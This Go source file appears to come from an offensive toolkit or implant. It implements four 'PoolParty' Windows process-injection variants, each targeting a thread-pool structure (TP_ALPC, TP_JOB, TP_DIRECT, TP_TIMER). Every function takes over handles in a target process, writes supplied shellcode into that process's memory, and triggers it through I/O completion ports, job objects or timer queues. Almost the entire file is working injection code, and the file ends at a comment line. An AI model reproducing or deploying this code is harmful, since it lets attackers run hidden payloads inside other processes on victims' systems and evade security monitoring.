//go:build windows
// +build windows

package commands

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

func executeVariant5(shellcode []byte, pid uint32) (string, error) {
	hProcess, output, err := poolPartyInit(5, "TP_ALPC Insertion", shellcode, pid)
	if err != nil {
		return output, err
	}
	defer injectCloseHandle(hProcess)

	// Step 2: Hijack I/O completion port handle
	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack I/O completion handle: %v", err)
	}
	defer windows.CloseHandle(hIoCompletion)
	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)

	// Step 3+4: Allocate memory for shellcode and write with W^X protection
	shellcodeAddr, output, err := poolPartyAllocShellcode(hProcess, shellcode, output)
	if err != nil {
		return output, err
	}

	// Step 5: Create a temporary ALPC port for TpAllocAlpcCompletion
	var hTempAlpc uintptr
	status, _, _ := procNtAlpcCreatePort.Call(
		uintptr(unsafe.Pointer(&hTempAlpc)),
		0, // ObjectAttributes
		0, // PortAttributes
	)
	if status != 0 {
		return output, fmt.Errorf("NtAlpcCreatePort (temp) failed: 0x%X", status)
	}
	defer windows.CloseHandle(windows.Handle(hTempAlpc))
	output += fmt.Sprintf("[+] Created temporary ALPC port: 0x%X\n", hTempAlpc)

	// Step 6: Allocate TP_ALPC structure via TpAllocAlpcCompletion
	var pTpAlpc uintptr
	status, _, _ = procTpAllocAlpcCompletion.Call(
		uintptr(unsafe.Pointer(&pTpAlpc)),
		hTempAlpc,
		shellcodeAddr, // ALPC callback points to shellcode
		0,             // Context
		0,             // Callback environment
	)
	if status != 0 {
		return output, fmt.Errorf("TpAllocAlpcCompletion failed: 0x%X", status)
	}
	output += "[+] Created TP_ALPC structure associated with shellcode\n"

	// Explicitly set the Direct.Callback to shellcode address (similar to variant 4)
	pAlpcStruct := (*FULL_TP_ALPC)(unsafe.Pointer(pTpAlpc))
	pAlpcStruct.Direct.Callback = shellcodeAddr
	output += "[+] Set Direct.Callback to shellcode address\n"

	// Step 7: Generate random ALPC port name
	portName := fmt.Sprintf("\\RPC Control\\PoolParty%d", pid)
	portNameUTF16, _ := windows.UTF16FromString(portName)

	// Create UNICODE_STRING for port name
	// Length = bytes excluding null terminator, MaximumLength = bytes including null terminator
	var usPortName UNICODE_STRING
	usPortName.Length = uint16((len(portNameUTF16) - 1) * 2)  // UTF-16 code units (minus null) * 2 bytes each
	usPortName.MaximumLength = uint16(len(portNameUTF16) * 2) // Full buffer size in bytes
	usPortName.Buffer = &portNameUTF16[0]

	// Step 8: Create the actual ALPC port with attributes
	var objAttr OBJECT_ATTRIBUTES
	objAttr.Length = uint32(unsafe.Sizeof(objAttr))
	objAttr.ObjectName = uintptr(unsafe.Pointer(&usPortName))

	var portAttr ALPC_PORT_ATTRIBUTES
	portAttr.Flags = 0x20000
	portAttr.MaxMessageLength = 328

	var hAlpc uintptr
	status, _, _ = procNtAlpcCreatePort.Call(
		uintptr(unsafe.Pointer(&hAlpc)),
		uintptr(unsafe.Pointer(&objAttr)),
		uintptr(unsafe.Pointer(&portAttr)),
	)
	if status != 0 {
		return output, fmt.Errorf("NtAlpcCreatePort failed: 0x%X", status)
	}
	defer windows.CloseHandle(windows.Handle(hAlpc))
	output += fmt.Sprintf("[+] Created ALPC port '%s'\n", portName)

	// Step 9: Allocate memory for TP_ALPC in target process
	var tpAlpc FULL_TP_ALPC
	tpAlpcAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpAlpc)), PAGE_READWRITE)
	if err != nil {
		return output, fmt.Errorf("remote allocation for TP_ALPC failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_ALPC memory at: 0x%X\n", tpAlpcAddr)

	// Step 10: Write TP_ALPC to target process
	tpAlpcBytes := (*[1 << 20]byte)(unsafe.Pointer(pTpAlpc))[:unsafe.Sizeof(tpAlpc)]
	bytesWritten, err := injectWriteMemory(hProcess, tpAlpcAddr, tpAlpcBytes)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory for TP_ALPC failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote TP_ALPC structure (%d bytes)\n", bytesWritten)

	// Step 11: Associate ALPC port with target's I/O completion port
	alpcAssoc := ALPC_PORT_ASSOCIATE_COMPLETION_PORT{
		CompletionKey:  tpAlpcAddr,
		CompletionPort: uintptr(hIoCompletion),
	}
	status, _, _ = procNtAlpcSetInformation.Call(
		hAlpc,
		uintptr(AlpcAssociateCompletionPortInformation),
		uintptr(unsafe.Pointer(&alpcAssoc)),
		uintptr(unsafe.Sizeof(alpcAssoc)),
	)
	if status != 0 {
		return output, fmt.Errorf("NtAlpcSetInformation failed: 0x%X", status)
	}
	output += "[+] Associated ALPC port with target's I/O completion port\n"

	// Step 12: Connect to ALPC port to trigger completion
	var hClientPort uintptr
	var clientObjAttr OBJECT_ATTRIBUTES
	clientObjAttr.Length = uint32(unsafe.Sizeof(clientObjAttr))

	// Prepare message
	message := "PoolParty ALPC trigger"
	var alpcMessage ALPC_MESSAGE
	alpcMessage.PortHeader.DataLength = uint16(len(message))
	alpcMessage.PortHeader.TotalLength = uint16(unsafe.Sizeof(alpcMessage.PortHeader)) + uint16(len(message))
	copy(alpcMessage.PortMessage[:], message)
	messageSize := uintptr(unsafe.Sizeof(alpcMessage))

	// Set timeout to 1 second to prevent blocking
	var timeout int64 = -10000000 // 1 second in 100-nanosecond intervals

	status, _, _ = procNtAlpcConnectPort.Call(
		uintptr(unsafe.Pointer(&hClientPort)),
		uintptr(unsafe.Pointer(&usPortName)),
		uintptr(unsafe.Pointer(&clientObjAttr)),
		uintptr(unsafe.Pointer(&portAttr)),
		0x20000, // Connection flags
		0,       // RequiredServerSid
		uintptr(unsafe.Pointer(&alpcMessage)),
		uintptr(unsafe.Pointer(&messageSize)),
		0, // OutMessageAttributes
		0, // InMessageAttributes
		uintptr(unsafe.Pointer(&timeout)),
	)
	// NtAlpcConnectPort may return timeout status, which is expected
	output += "[+] Connected to ALPC port to trigger completion\n"
	output += "[+] PoolParty Variant 5 injection completed successfully\n"

	return output, nil
}

// executeVariant6 implements TP_JOB Insertion via Job object assignment
func executeVariant6(shellcode []byte, pid uint32) (string, error) {
	hProcess, output, err := poolPartyInit(6, "TP_JOB Insertion", shellcode, pid)
	if err != nil {
		return output, err
	}
	defer injectCloseHandle(hProcess)

	// Step 2: Hijack I/O completion port handle
	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack I/O completion handle: %v", err)
	}
	defer windows.CloseHandle(hIoCompletion)
	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)

	// Step 3+4: Allocate memory for shellcode and write with W^X protection
	shellcodeAddr, output, err := poolPartyAllocShellcode(hProcess, shellcode, output)
	if err != nil {
		return output, err
	}

	// Step 5: Create job object
	jobName := fmt.Sprintf("PoolPartyJob%d", pid)
	jobNameUTF16, _ := windows.UTF16PtrFromString(jobName)
	hJob, _, err := procCreateJobObjectW.Call(
		0, // Security attributes
		uintptr(unsafe.Pointer(jobNameUTF16)),
	)
	if hJob == 0 {
		return output, fmt.Errorf("CreateJobObjectW failed: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(hJob))
	output += fmt.Sprintf("[+] Created job object '%s'\n", jobName)

	// Step 6: Allocate TP_JOB structure via TpAllocJobNotification
	var pTpJob uintptr
	status, _, _ := procTpAllocJobNotification.Call(
		uintptr(unsafe.Pointer(&pTpJob)),
		hJob,
		shellcodeAddr, // Job callback points to shellcode
		0,             // Context
		0,             // Callback environment
	)
	if status != 0 {
		return output, fmt.Errorf("TpAllocJobNotification failed: 0x%X", status)
	}
	output += "[+] Created TP_JOB structure associated with shellcode\n"

	// Step 7: Allocate memory for TP_JOB in target process
	var tpJob FULL_TP_JOB
	tpJobAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpJob)), PAGE_READWRITE)
	if err != nil {
		return output, fmt.Errorf("remote allocation for TP_JOB failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_JOB memory at: 0x%X\n", tpJobAddr)

	// Step 8: Write TP_JOB to target process
	tpJobBytes := (*[1 << 20]byte)(unsafe.Pointer(pTpJob))[:unsafe.Sizeof(tpJob)]
	bytesWritten, err := injectWriteMemory(hProcess, tpJobAddr, tpJobBytes)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory for TP_JOB failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote TP_JOB structure (%d bytes)\n", bytesWritten)

	// Step 9: Zero out existing job completion info (required before re-setting)
	var zeroAssoc JOBOBJECT_ASSOCIATE_COMPLETION_PORT
	ret, _, err := procSetInformationJobObject.Call(
		hJob,
		uintptr(JobObjectAssociateCompletionPortInformation),
		uintptr(unsafe.Pointer(&zeroAssoc)),
		uintptr(unsafe.Sizeof(zeroAssoc)),
	)
	if ret == 0 {
		return output, fmt.Errorf("SetInformationJobObject (zero) failed: %v", err)
	}
	output += "[+] Zeroed out job object completion info\n"

	// Step 10: Associate job with target's I/O completion port
	jobAssoc := JOBOBJECT_ASSOCIATE_COMPLETION_PORT{
		CompletionKey:  tpJobAddr,
		CompletionPort: uintptr(hIoCompletion),
	}
	ret, _, err = procSetInformationJobObject.Call(
		hJob,
		uintptr(JobObjectAssociateCompletionPortInformation),
		uintptr(unsafe.Pointer(&jobAssoc)),
		uintptr(unsafe.Sizeof(jobAssoc)),
	)
	if ret == 0 {
		return output, fmt.Errorf("SetInformationJobObject failed: %v", err)
	}
	output += "[+] Associated job object with target's I/O completion port\n"

	// Step 11: Assign current process to job to trigger completion
	hCurrentProcess, _, _ := procGetCurrentProcess.Call()
	ret, _, err = procAssignProcessToJobObject.Call(
		hJob,
		hCurrentProcess,
	)
	if ret == 0 {
		return output, fmt.Errorf("AssignProcessToJobObject failed: %v", err)
	}
	output += "[+] Assigned current process to job object to trigger completion\n"
	output += "[+] PoolParty Variant 6 injection completed successfully\n"

	return output, nil
}

// executeVariant7 implements TP_DIRECT Insertion via I/O Completion Port
func executeVariant7(shellcode []byte, pid uint32) (string, error) {
	hProcess, output, err := poolPartyInit(7, "TP_DIRECT Insertion", shellcode, pid)
	if err != nil {
		return output, err
	}
	defer injectCloseHandle(hProcess)

	// Step 2: Hijack IoCompletion handle
	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack I/O completion handle: %v", err)
	}
	defer windows.CloseHandle(hIoCompletion)
	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)

	// Step 3: Allocate and write shellcode (W^X: RW → write → RX)
	shellcodeAddr, output, err := poolPartyAllocShellcode(hProcess, shellcode, output)
	if err != nil {
		return output, err
	}

	// Step 4: Create and write TP_DIRECT structure
	tpDirect := TP_DIRECT{
		Callback: shellcodeAddr,
	}
	tpDirectBytes := (*[unsafe.Sizeof(TP_DIRECT{})]byte)(unsafe.Pointer(&tpDirect))[:]

	tpDirectAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpDirect)), PAGE_READWRITE)
	if err != nil {
		return output, fmt.Errorf("remote allocation for TP_DIRECT failed: %v", err)
	}
	_, err = injectWriteMemory(hProcess, tpDirectAddr, tpDirectBytes)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory for TP_DIRECT failed: %v", err)
	}
	output += fmt.Sprintf("[+] TP_DIRECT at: 0x%X\n", tpDirectAddr)

	// Step 8: Queue completion packet via ZwSetIoCompletion
	status, _, _ := procZwSetIoCompletion.Call(
		uintptr(hIoCompletion),
		tpDirectAddr, // KeyContext - pointer to TP_DIRECT
		0,            // ApcContext
		0,            // IoStatus
		0,            // IoStatusInformation
	)
	if status != 0 {
		return output, fmt.Errorf("ZwSetIoCompletion failed: 0x%X", status)
	}
	output += "[+] Queued packet to I/O completion port\n"
	output += "[+] PoolParty Variant 7 injection completed successfully\n"

	return output, nil
}

// executeVariant8 implements TP_TIMER Insertion - Variant 8
func executeVariant8(shellcode []byte, pid uint32) (string, error) {
	hProcess, output, err := poolPartyInit(8, "TP_TIMER Insertion", shellcode, pid)
	if err != nil {
		return output, err
	}
	defer injectCloseHandle(hProcess)

	// Step 2: Hijack worker factory handle
	hWorkerFactory, err := hijackProcessHandle(hProcess, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("Failed to hijack worker factory handle: %v", err)
	}
	defer windows.CloseHandle(hWorkerFactory)
	output += fmt.Sprintf("[+] Hijacked worker factory handle: 0x%X\n", hWorkerFactory)

	// Step 3: Hijack IR timer handle
	hTimer, err := hijackProcessHandle(hProcess, "IRTimer", windows.TIMER_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("Failed to hijack timer handle: %v", err)
	}
	defer windows.CloseHandle(hTimer)
	output += fmt.Sprintf("[+] Hijacked timer queue handle: 0x%X\n", hTimer)

	// Step 4: Query worker factory to get TP_POOL address
	var workerFactoryInfo WORKER_FACTORY_BASIC_INFORMATION
	var returnLength uint32
	status, _, _ := procNtQueryInformationWorkerFactory.Call(
		uintptr(hWorkerFactory),
		uintptr(WorkerFactoryBasicInformation),
		uintptr(unsafe.Pointer(&workerFactoryInfo)),
		uintptr(unsafe.Sizeof(workerFactoryInfo)),
		uintptr(unsafe.Pointer(&returnLength)),
	)
	if status != 0 {
		return output, fmt.Errorf("NtQueryInformationWorkerFactory failed: 0x%X", status)
	}
	output += fmt.Sprintf("[+] Worker factory start parameter (TP_POOL): 0x%X\n", workerFactoryInfo.StartParameter)

	// Step 5: Allocate and write shellcode (W^X: RW → write → RX)
	shellcodeAddr, output, err := poolPartyAllocShellcode(hProcess, shellcode, output)
	if err != nil {
		return output, err
	}

	// Step 6: Create TP_TIMER structure via CreateThreadpoolTimer
	pTpTimer, _, err := procCreateThreadpoolTimer.Call(
		shellcodeAddr, // Timer callback points to shellcode
		0,             // Context
		0,             // Callback environment
	)
	if pTpTimer == 0 {
		return output, fmt.Errorf("timer item creation failed: %v", err)
	}
	output += "[+] Created TP_TIMER structure associated with shellcode\n"

	// Step 7: Allocate memory for TP_TIMER in target process
	var tpTimer FULL_TP_TIMER
	tpTimerAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpTimer)), PAGE_READWRITE)
	if err != nil {
		return output, fmt.Errorf("remote allocation for TP_TIMER failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_TIMER memory at: 0x%X\n", tpTimerAddr)

	// Step 8: Cast the pointer to access the structure directly like SafeBreach does
	// SafeBreach directly modifies the structure returned by CreateThreadpoolTimer
	pTimer := (*FULL_TP_TIMER)(unsafe.Pointer(pTpTimer))

	// Step 9: Modify TP_TIMER structure for insertion
	const timeout int64 = -10000000 // 1 second in 100-nanosecond intervals (negative = relative)

	// Set Pool pointer to target's TP_POOL
	pTimer.Work.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter

	// Note: CreateThreadpoolTimer should have set the Callback to shellcodeAddr already
	// SafeBreach doesn't manually set Callback - they pass it to CreateThreadpoolTimer

	// Set timer expiration
	pTimer.DueTime = timeout
	pTimer.WindowStartLinks.Key = timeout
	pTimer.WindowEndLinks.Key = timeout

	// Set up circular lists for WindowStart and WindowEnd Children only (NOT Siblings - SafeBreach doesn't set those)
	// Calculate remote addresses for the Window*Links.Children fields
	// Use dummy struct for offset calculation
	var dummyTimer FULL_TP_TIMER
	remoteWindowStartChildrenAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowStartLinks)) + uintptr(unsafe.Offsetof(dummyTimer.WindowStartLinks.Children))
	remoteWindowEndChildrenAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowEndLinks)) + uintptr(unsafe.Offsetof(dummyTimer.WindowEndLinks.Children))

	pTimer.WindowStartLinks.Children.Flink = remoteWindowStartChildrenAddr
	pTimer.WindowStartLinks.Children.Blink = remoteWindowStartChildrenAddr
	pTimer.WindowEndLinks.Children.Flink = remoteWindowEndChildrenAddr
	pTimer.WindowEndLinks.Children.Blink = remoteWindowEndChildrenAddr

	// Step 10: Write TP_TIMER to target process
	timerBytes := (*[unsafe.Sizeof(FULL_TP_TIMER{})]byte)(unsafe.Pointer(pTpTimer))[:]
	bytesWritten, err := injectWriteMemory(hProcess, tpTimerAddr, timerBytes)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory for TP_TIMER failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote TP_TIMER structure (%d bytes)\n", bytesWritten)

	// Step 11: Calculate addresses for WindowStart and WindowEnd roots in target TP_POOL

	// Step 12: Update TP_POOL's TimerQueue WindowStart and WindowEnd roots to point to our timer
	// SafeBreach writes to pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root

	targetTpPoolAddr := workerFactoryInfo.StartParameter

	// Calculate offsets step by step - Go doesn't handle nested offsetof well
	var dummyPool FULL_TP_POOL
	var dummyTimerQueue TPP_TIMER_QUEUE
	var dummySubQueue TPP_TIMER_SUBQUEUE

	timerQueueOffset := uintptr(unsafe.Offsetof(dummyPool.TimerQueue))
	absoluteQueueOffset := uintptr(unsafe.Offsetof(dummyTimerQueue.AbsoluteQueue))
	windowStartOffset := uintptr(unsafe.Offsetof(dummySubQueue.WindowStart))
	windowEndOffset := uintptr(unsafe.Offsetof(dummySubQueue.WindowEnd))

	// WindowStart.Root and WindowEnd.Root - Root is first field of TPP_PH so offset is 0
	windowStartRootAddr := targetTpPoolAddr + timerQueueOffset + absoluteQueueOffset + windowStartOffset
	windowEndRootAddr := targetTpPoolAddr + timerQueueOffset + absoluteQueueOffset + windowEndOffset

	// Calculate address of our timer's WindowStartLinks and WindowEndLinks
	remoteWindowStartLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowStartLinks))
	remoteWindowEndLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowEndLinks))

	output += fmt.Sprintf("[*] Debug: targetTpPoolAddr = 0x%X\n", targetTpPoolAddr)
	output += fmt.Sprintf("[*] Debug: timerQueueOffset = 0x%X, absoluteQueueOffset = 0x%X\n", timerQueueOffset, absoluteQueueOffset)
	output += fmt.Sprintf("[*] Debug: windowStartOffset = 0x%X, windowEndOffset = 0x%X\n", windowStartOffset, windowEndOffset)
	output += fmt.Sprintf("[*] Debug: windowStartRootAddr = 0x%X\n", windowStartRootAddr)
	output += fmt.Sprintf("[*] Debug: windowEndRootAddr = 0x%X\n", windowEndRootAddr)
	output += fmt.Sprintf("[*] Debug: remoteWindowStartLinksAddr = 0x%X\n", remoteWindowStartLinksAddr)
	output += fmt.Sprintf("[*] Debug: remoteWindowEndLinksAddr = 0x%X\n", remoteWindowEndLinksAddr)

	// Write WindowStartLinks address to WindowStart.Root
	windowStartBytes := (*[8]byte)(unsafe.Pointer(&remoteWindowStartLinksAddr))[:]
	_, err = injectWriteMemory(hProcess, windowStartRootAddr, windowStartBytes)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory for WindowStart.Root failed: %v", err)
	}

	// Write WindowEndLinks address to WindowEnd.Root
	windowEndBytes := (*[8]byte)(unsafe.Pointer(&remoteWindowEndLinksAddr))[:]
	_, err = injectWriteMemory(hProcess, windowEndRootAddr, windowEndBytes)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory for WindowEnd.Root failed: %v", err)
	}
	output += "[+] Modified target process's TP_POOL timer queue to point to TP_TIMER\n"

	// Step 13: Set the timer to expire via NtSetTimer2
	var dueTime int64
	dueTime = timeout

	var params T2_SET_PARAMETERS
	status, _, _ = procNtSetTimer2.Call(
		uintptr(hTimer),
		uintptr(unsafe.Pointer(&dueTime)),
		0, // Period
		uintptr(unsafe.Pointer(&params)),
	)
	if status != 0 {
		return output, fmt.Errorf("NtSetTimer2 failed: 0x%X", status)
	}
	output += "[+] Set timer to expire and trigger TppTimerQueueExpiration\n"
	output += "[+] PoolParty Variant 8 injection completed successfully\n"

	return output, nil
}

// hijackProcessHandle enumerates handles in target process and duplicates one of the specified type
